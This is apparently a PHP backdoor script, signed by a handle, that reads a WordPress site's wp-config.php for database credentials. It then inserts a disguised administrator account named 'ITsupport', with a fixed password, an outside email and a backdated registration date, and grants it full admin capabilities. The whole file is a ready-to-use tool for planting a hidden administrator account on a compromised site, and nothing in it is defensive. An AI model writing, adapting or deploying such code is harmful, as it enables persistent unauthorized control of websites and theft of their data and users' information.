<?php
// CREATE BY MATIGAN1337
// Path ke file wp-config.php Anda
// Mendapatkan dokumen root (root directory) dari situs web Anda
$document_root = $_SERVER['DOCUMENT_ROOT'];

// Path ke file wp-config.php Anda
$wp_config_path = $document_root . '/wp-config.php';

// Variabel untuk data pengguna
$user = 'ITsupport'; // Ganti dengan nama pengguna yang Anda inginkan
$user_password = 'Askurm0m#'; // Ganti dengan kata sandi yang Anda inginkan
$email = 'askurmom4me@proton.me'; // Ganti dengan alamat email yang Anda inginkan

// Periksa apakah file wp-config.php ada
if (file_exists($wp_config_path)) {
    // Sertakan file wp-config.php
    require_once($wp_config_path);

    // Sekarang Anda dapat mengakses informasi koneksi database
    $localhost = DB_HOST;
    $database = DB_NAME;
    $username = DB_USER;
    $password = DB_PASSWORD;
    $prefix = $table_prefix;

    // Buat koneksi ke database MySQL
    $conn = @mysqli_connect($localhost, $username, $password, $database) or die(mysqli_error($conn));

    // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
    $sqlInsertUser = "INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_status, user_registered, user_nicename) VALUES ('$user', MD5('$user_password'), '$email', '0', '2022-09-09 05:42:56', 'Staff')";

    // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
    $insertUserResult = @mysqli_query($conn, $sqlInsertUser) or die(mysqli_error($conn));

    // Periksa jika pengguna berhasil dimasukkan
    if ($insertUserResult) {
        echo 'Berhasil... ' . $user . ' telah dibuat dengan kata sandi: ' . $user_password;

        // Dapatkan ID pengguna yang dimasukkan
        $userId = mysqli_insert_id($conn);

        // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
        $sqlInsertUsermeta1 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
        $sqlInsertUsermeta2 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}user_level', '10')";

        // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
        $insertUsermetaResult1 = @mysqli_query($conn, $sqlInsertUsermeta1) or die(mysqli_error($conn));
        $insertUsermetaResult2 = @mysqli_query($conn, $sqlInsertUsermeta2) or die(mysqli_error($conn));

        if ($insertUsermetaResult1 && $insertUsermetaResult2) {
            
        } else {
            echo 'Error saat memasukkan data tambahan ke dalam tabel wp_usermeta.';
        }
    } else {
        echo 'Error saat memasukkan data ke dalam tabel wp_users.';
    }

    // Tutup koneksi database
    mysqli_close($conn);
} else {
    echo 'File wp-config.php tidak ditemukan.';
}
?>
